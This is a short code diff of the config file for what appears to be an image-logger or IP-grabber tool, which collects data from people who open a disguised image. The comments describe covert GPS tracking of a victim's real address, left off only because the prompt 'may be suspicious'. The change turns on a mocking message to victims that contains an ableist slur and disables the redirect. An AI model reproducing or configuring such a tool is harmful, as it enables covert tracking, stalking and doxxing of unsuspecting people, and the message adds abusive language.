@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "404 Error. This returned false on our end.", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Did u think you were getting an E-girl? Dont be retarded.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://media.tenor.com/3NLDOEUwbRsAAAAe/ip-grabbed.png" # Link to the webpage to redirect to 
     },
 
